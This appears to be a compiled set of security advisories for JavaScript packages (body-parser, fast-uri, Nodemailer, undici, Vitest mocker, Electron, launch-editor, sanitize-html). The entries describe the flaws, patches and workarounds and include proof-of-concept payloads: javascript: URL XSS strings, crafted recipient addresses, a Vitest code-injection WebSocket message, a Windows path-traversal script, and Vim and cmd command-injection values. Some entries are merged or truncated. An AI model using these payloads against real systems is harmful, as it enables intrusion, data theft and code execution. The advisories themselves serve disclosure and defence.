security_advisory.summary: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body
security_advisory.description:
### Impact

A single request can crash any application using `body-parser` with default options. When a request carries a `Content-Encoding` (for example `gzip`), `body-parser` pipes it into a decompression stream and, after reading the body, leaves that stream piped with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No authentication or matching route is required, since parsing runs before routing.

### Patches

Fixed in body-parser 2.4.0 and 1.20.9. Upgrade to one of these versions.

### Workarounds

Pass `inflate: false` to the body-parser middleware if the application does not need to accept compressed request bodies. This rejects encoded requests before any decompression stream is created.

security_advisory.summary: fast-uri vulnerable to improper path equivalence in relative reference normalization
security_advisory.description:
### Impact

`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.

For example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.

Applications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Do not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.

security_advisory.summary: fast-uri vulnerable to URI scheme spoofing via percent-encoded scheme decoding
security_advisory.description:
### Impact

`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.

For example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.

An application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Reject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.

cwes.name: Improper Encoding or Decoding of Data
Incorrect Behavior Order: Validate Before Canonicalize

security_advisory.summary: fast-uri vulnerable to scheme injection via an unescaped first-segment colon in suffix references
security_advisory.description:
### Impact

`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.

For example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.

Applications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Do not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.

security_advisory.summary: Nodemailer: A ";" inside a quoted string or comment ends an address group early in addressparser, turning display text into a recipient
security_advisory.description:
### Vulnerability summary

addressparser ends an RFC 5322 group at the first `;`, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. `G: (a; <evil@evil.com>) <v@victim.com>;` names only `v@victim.com`, and Nodemailer read it as the single recipient `evil@evil.com`. Affected: 3.0.0 through 10.1.3.

### Attacker capabilities

The attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.

### Realistic exploitation scenario

An application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits `G: (a; <evil@evil.com>) <v@victim.com>;`. The validator sees one mailbox, `v@victim.com`, and approves it. Nodemailer delivers to `evil@evil.com` only. The same works through a quoted display name, `G: "a;" "<evil@evil.com>" <v@victim.com>;`. The boundary crossed is the application's recipient allow list.

### Proof of concept

```js
const addressparser = require('nodemailer/lib/addressparser');
console.log(addressparser("G: (a; <evil@evil.com>) <v@victim.com>;"));
// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]
```

Python's `email._header_value_parser.get_address_list` reads the same value as the single mailbox `v@victim.com`, with no defects reported.

The envelope a message gets is built from the same parse, so `sendMail({ to: "G: (a; <evil@evil.com>) <v@victim.com>;" })` issues the RCPT TO shown above.

### Security impact

Mail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.

The fix tracks quoted strings and comments inside a group and reads only a `;` outside them.


Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.

security_advisory.summary: Nodemailer: A nested comment ends early in addressparser, releasing the rest of the comment as a recipient
security_advisory.description:
### Vulnerability summary

RFC 5322 comments nest. addressparser ended a comment at the first `)`, including the one that closes a nested comment, and parsed the rest of the outer comment as header text. `Victim (x(y) <evil@evil.com>) <v@victim.com>` names `v@victim.com` with `x(y) <evil@evil.com>` as a comment, and Nodemailer read it as the address `evil@evil.com`. This is the same shape as the escaped parenthesis fixed in 10.1.2, reached through nesting instead of a quoted-pair. Affected: 3.0.0 through 10.1.3.

### Attacker capabilities

The attacker controls the text of an address that an application passes to Nodemailer, or the From or To header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.

### Realistic exploitation scenario

An application validates a submitted address with a conformant parser and allows only its own domain. The attacker submits `Victim (x(y) <evil@evil.com>) <v@victim.com>`, which validates as `v@victim.com`. Nodemailer delivers to `evil@evil.com`. In the inbound direction, a DMARC or display layer built on a conformant parser and a mail client built on mailparser disagree on the author of the same message, which is the setting for sender spoofing. The boundary crossed is the application's recipient allow list, or the author check of the receiving side.

### Proof of concept

```js
const addressparser = require('nodemailer/lib/addressparser');
console.log(addressparser("Victim (x(y) <evil@evil.com>) <v@victim.com>"));
// [ { address: 'evil@evil.com', name: 'Victim) v@victim.com' } ]
```

Python's `email._header_value_parser.get_address_list` reads the same value as `v@victim.com` with the display name `Victim`, with no defects reported.

The envelope a message gets is built from the same parse, so `sendMail({ to: "Victim (x(y) <evil@evil.com>) <v@victim.com>" })` issues the RCPT TO shown above.

### Security impact

Mail intended for an approved recipient is delivered to an attacker chosen domain, disclosing its content, and parsers built on this module report a different author than conformant ones. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.

The fix counts comment depth and ends a comment only at the `)` that closes the outermost one.

Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.

security_advisory.summary: ip-address: Address6 matches a zone identifier in quadratic time ahead of its length limit, allowing a single long string to stall the process
undici vulnerable to Denial of Service via unhandled error on excessive content-encodings
security_advisory.description:
### Impact

undici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.

### Workarounds

None.

security_advisory.summary: undici vulnerable to Subresource Integrity bypass via non-lowercase algorithm tokens
security_advisory.description:
### Impact

undici's `fetch()` verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as `SHA256-...` or `Sha256-...` is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.

An application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.

### Patches

Upgrade to `7.30.1` or `8.12.2`. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.

### Workarounds

Use lowercase algorithm tokens (`sha256`, `sha384`, `sha512`) in `integrity` metadata.

security_advisory.summary: fast-uri vulnerable to host confusion via unchecked WHATWG host canonicalization
security_advisory.description:
### Impact

`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.

For example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.

Applications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Reject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.

security_advisory.summary: Vitest: Code injection via unauthenticated manual mock registration
security_advisory.description:
### Summary

`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.

Same handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.

### Patches

Fixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.

Projects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.

### Details

`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:

```ts
export function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '"__vitest_mocker__"'): string {
  const source = `
const __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule("${moduleUrl}");
`
```

`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.

`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:

```ts
configureServer(server) {
  if (options.registerWebSocketEvents === false) { return }
  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {
    if (event.type === 'manual') {
      const module = ManualMockedModule.fromJSON(event, async () => {
        const keys = await getFactoryExports(event.url)
        return Object.fromEntries(keys.map(key => [key, null]))
      })
      registry.add(module)                       // no validation of `id` or `url`
    }
    else {
      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }
```

`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.

With `url = 'x"); globalThis.ARES_INJECTED = 1; void("'` a request for `/src/app.js` is answered with valid, executable JavaScript:

```js
const __factoryModule__ = await globalThis["__vitest_mocker__"].getFactoryModule("x"); globalThis.ARES_INJECTED = 1; void("");
```

`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__["X"]`, `export { __0 as "X" }` and `resolvedModule["X"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.

**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.

### PoC

`poc/mocker-manual-mock-injection/` — `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.

Environment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.

```bash
git clone https://github.com/vitest-dev/vitest && cd vitest
git checkout 9e1166959e14bd32298d8a0e85352431c769ec7a
pnpm install && pnpm build
REPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh
```

Required configuration — the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):

```ts
import { interceptorPlugin } from '@vitest/mocker/node'
export default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()
```

The attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:

```json
{ "type": "custom", "event": "vitest:interceptor:register",
  "data": { "type": "manual", "raw": "", "id": "<abs path of a served module>",
            "url": "x\"); globalThis.ARES_INJECTED = 1; void(\"" } }
```

then answering the server's `vitest:interceptor:resolve` with `{"type":"custom","event":"vitest:interceptor:resolved","data":{"url":"<same url>","keys":["a"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.

Observed output:

```
PASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400
PASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400
PASS  negative control: with no mock registered the real module is served
PASS  negative control: a mock with a harmless url replaces the module but injects nothing
--- module served for /src/app.js ---
    const __factoryModule__ = await globalThis["__vitest_mocker__"].getFactoryModule("x"); globalThis.ARES_INJECTED = 1; void("");

    let __0 = __factoryModule__["a"]
    export { __0 as "a" }
    if (__factoryModule__.__factoryPromise != null) {
      __factoryModule__.__factoryPromise.then((resolvedModule) => {
        __0 = resolvedModule["a"];
      })
    }
PASS  attacker statement is present in the module the dev server serves
PASS  the real module body was replaced
PASS  the injected module parses as JavaScript (Vite import analysis accepted it)

RESULT: VULNERABLE
```

* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.
* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.
* **Precondition controls** — the two `Origin` probes record the boundary honestly.
* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with "content contains invalid JS syntax"), so acceptance proves the injected module is valid, executable JavaScript.

Reproduced three times from a clean `mktemp` fixture, exit 0 each time.

### Impact

Code injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.

### Credits

- Thai Son Dinh from VinSOC Labs (R&D)

Disclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.

Improper Encoding or Escaping of Output

security_advisory.summary: Vitest: Windows backslash traversal bypasses the @vitest/mocker redirect allowlist fix
security_advisory.description:
## Summary

The path traversal fix released for [GHSA-82fw-gwwq-j7x9](https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9) can be bypassed on Windows by using a backslash in the redirect URL pathname.

The fixed code joins an attacker-controlled URL pathname with the Vite root using `node:path/posix`, then passes that string to Vite's file allowlist check. On Windows, a value such as `C:/project/root/..\secret.txt` retains `..\` during the POSIX join and begins with the allowed root, so the allowlist accepts it. The later `readFile()` call uses Windows filesystem semantics, where the backslash is a path separator, and reads the sibling file outside the configured root.

I reproduced the issue with the published `@vitest/mocker` packages in both fixed release lines:

- `@vitest/mocker@4.1.11`
- `@vitest/mocker@5.0.0`

The current `main` source at commit `2ce29d5fa758046e5453bd92b8ed6c9da9709bb5` has the same behavior.

## Patches

Fixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. The redirect registration now converts backslashes in the URL pathname to forward slashes before it joins the pathname with the root, so `..\` resolves the same as `../` and the allowlist check rejects it.

## Relationship to GHSA-82fw-gwwq-j7x9

This is a bypass of the accepted fix, not a separate unrelated path. It uses the same `vitest:interceptor:register` redirect registration and the same file-reading sink as the original advisory. A forward-slash traversal is rejected after the fix, while the equivalent Windows backslash traversal is accepted.

The original advisory marks 4.1.11 and 5.0.0-rc.2 as patched. The newly affected ranges introduced by the incomplete fix are therefore:

- `4.1.11`
- `>=5.0.0-rc.2, <5.0.3`

Older affected releases remain covered by GHSA-82fw-gwwq-j7x9.

## Root cause

`packages/mocker/src/node/interceptorPlugin.ts` imports `join` from `node:path/posix`. Redirect registration currently performs the equivalent of:

```ts
const redirect = join(server.config.root, redirectUrl.pathname)
if (!isFileLoadingAllowed(server.config, redirect)) return
event.redirect = redirect
```

The registered value later reaches:

```ts
readFile(mock.redirect, 'utf-8')
```

Vite's allowlist check expects a normalized absolute filesystem path. On Windows, POSIX joining does not normalize backslashes, but `readFile` interprets them as separators. The check and the sink therefore interpret the same string differently.

The authenticated browser RPC fallback in `packages/browser/src/node/rpc.ts` is not affected: it joins the path with `pathe`, which converts backslashes to forward slashes before the access check. The reproduction below targets the public mocker WebSocket registration path.

## Preconditions and impact

A client that can reach a Vite server using the public `mockerPlugin` or standalone `interceptorPlugin` WebSocket registration can register a redirect mock. On Windows, the client can then request the registered module and read a file outside `server.fs.allow` that the Vitest/Vite process account can access. Vitest Browser Mode does not register these WebSocket handlers in the affected versions.

The reproduction uses an unauthenticated Vite HMR WebSocket connection and a normal HTTP GET. It does not call the plugin's internal transform API. The practical network reachability is the same deployment precondition described by the original advisory; default loopback-only development servers are correspondingly less exposed.

## Reproduction

Tested on GitHub-hosted Windows Server 2025 with Node.js 22. The test creates only temporary synthetic files: a Vite root directory and a sibling `secret.txt` containing a canary.

Install dependencies for either affected line:

```console
npm install @vitest/mocker@4.1.11 vite@7.1.5 ws@8.18.3
# or
npm install @vitest/mocker@5.0.0 vite@7.1.5 ws@8.18.3
node poc.mjs
```

`poc.mjs`:

```js
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { randomUUID } from 'node:crypto'
import { interceptorPlugin } from '@vitest/mocker/node'
import { createServer } from 'vite'
import { WebSocket } from 'ws'

const base = join(tmpdir(), `vitest-path-${randomUUID()}`)
const root = join(base, 'root')
const secret = join(base, 'secret.txt')
await mkdir(root, { recursive: true })
await writeFile(secret, 'SYNTHETIC_OUTSIDE_ROOT_CANARY')

const server = await createServer({
  root,
  configFile: false,
  logLevel: 'silent',
  server: { fs: { allow: [root] } },
  plugins: [
    {
      name: 'validation:virtual-modules',
      enforce: 'pre',
      resolveId(id) {
        if (id === '/control' || id === '/bypass') return id
      },
    },
    interceptorPlugin(),
  ],
})

await server.listen()
const port = new URL(server.resolvedUrls.local[0]).port
const baseUrl = server.resolvedUrls.local[0]

function register(id, redirect) {
  return new Promise((resolve, reject) => {
    const socket = new WebSocket(`ws://localhost:${port}`, 'vite-hmr')
    const timer = setTimeout(() => reject(new Error('registration timeout')), 5000)
    socket.on('message', (raw) => {
      let message
      try { message = JSON.parse(raw.toString()) } catch { return }
      if (message.type === 'custom' && message.event === 'vitest:interceptor:register:result') {
        clearTimeout(timer)
        socket.close()
        resolve()
      }
    })
    socket.on('open', () => socket.send(JSON.stringify({
      type: 'custom',
      event: 'vitest:interceptor:register',
      data: { type: 'redirect', raw: '', id, url: id, redirect },
    })))
    socket.on('error', reject)
  })
}

try {
  await register('/control', 'traversal:../secret.txt')
  const controlResponse = await fetch(new URL('/control', baseUrl))
  const controlBody = await controlResponse.text()

  await register('/bypass', 'traversal:..\\secret.txt')
  const bypassResponse = await fetch(new URL('/bypass', baseUrl))
  const bypassBody = await bypassResponse.text()

  const result = {
    platform: process.platform,
    root,
    outsideFile: secret,
    slashTraversalStatus: controlResponse.status,
    slashTraversalRejected: !controlBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),
    backslashTraversalStatus: bypassResponse.status,
    backslashTraversalReturnedOutsideCanary: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),
    returnedBody: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY') ? 'SYNTHETIC_OUTSIDE_ROOT_CANARY' : null,
    expectedBackslashTraversalBlocked: process.env.EXPECT_BLOCKED === '1',
  }
  console.log(JSON.stringify(result, null, 2))
  const backslashResultMatchesExpectation = result.expectedBackslashTraversalBlocked

  if (!result.slashTraversalRejected || !backslashResultMatchesExpectation) process.exitCode = 1
```

security_advisory.summary: Electron: HID and USB permission checks can be attributed to the wrong origin
security_advisory.description:
### Impact
For `hid` and `usb` permission checks made from an iframe, `session.setPermissionCheckHandler` was given the top-level frame's origin and details instead of the requesting frame's. Apps that allow these permissions based on origin could grant an embedded frame access intended for the top-level page.

You're only affected if you use `setPermissionCheckHandler` with origin-based logic for `hid` or `usb` and embed cross-origin iframes with `allow="hid"` or `allow="usb"`. Apps that don't delegate those features to untrusted iframes are not affected.

### Workarounds
Don't add `allow="hid"` / `allow="usb"` to untrusted iframes, or make the decision in your `select-hid-device` / `select-usb-device` handler using `details.frame`.

### Fixed Versions

* `44.3.0`
* `43.7.0`
* `42.11.3`

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)

security_advisory.summary: launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors
security_advisory.description:
### Summary

`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.

### Impact

#### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL

#### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

#### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The user is using WSL

### Details

`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the embedded Ex command.

The following editor has a potentially destructive operation exposed to the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.

security_advisory.summary: launch-editor: `fs.existsSync()` existence check can be bypassed on Windows
security_advisory.description:
### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.

Combined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.

### Impact

Only apps that runs on Windows is affected.

### Details

The earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.
4. Because the existence check passes, the crafted filename reaches the Windows shell command.

security_advisory.summary: launch-editor: escapeCmdArgs() omits % escaping on Windows
security_advisory.description:
### Summary

`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.

### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing `&` or `%`
- Either of
  - An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.

Because `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`

security_advisory.summary: ApostropheCMS: Incomplete CVE-2026-53606: `meta http-equiv=refresh` `content` still ships `javascript:` / `data:` URLs
security_advisory.description:
### Summary

CVE-2026-53606 expanded `allowedSchemesAppliedToAttributes` so named URL attributes (`action`, `formaction`, `data`, `poster`, `background`, later `ping`, `xlink:href`, …) go through `naughtyHref()`. A **URL nested inside `meta` `content`** (`http-equiv=refresh`) is not an attribute name on that list, so the embedded destination is never scheme-checked.

Default `allowedTags` still omit `meta`. Same non-default integrator config as 53606: allow `meta` plus `http-equiv` / `content`.

On **2.17.7**:

```text
sanitizeHtml(
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  { allowedTags: ['meta'], allowedAttributes: { meta: ['http-equiv', 'content'] } }
)
// => <meta http-equiv="refresh" content="0;url=javascript:alert(1)" />
```

`data:text/html,…` and arbitrary `https:` destinations also survive. `formaction="javascript:…"` (53606) is stripped.

Please **Request CVE**. Credit: Finder + Reporter (`adrbogacz`).

### Details

`naughtyHref()` only runs when the attribute name is in `allowedSchemesAppliedToAttributes` (`index.js` ~385). Refresh URLs live in a `content` value of the form `0;url=…`, so the gate never fires. Adding `content` to that list wholesale would break ordinary meta `content` (description, viewport).

**Fix:** when `http-equiv` is `refresh` (case-insensitive), parse the `; url=` destination and run `naughtyHref('meta', url)`. Drop `content` (or the tag) if the URL is rejected. Leave other `meta` `content` values alone.

### PoC

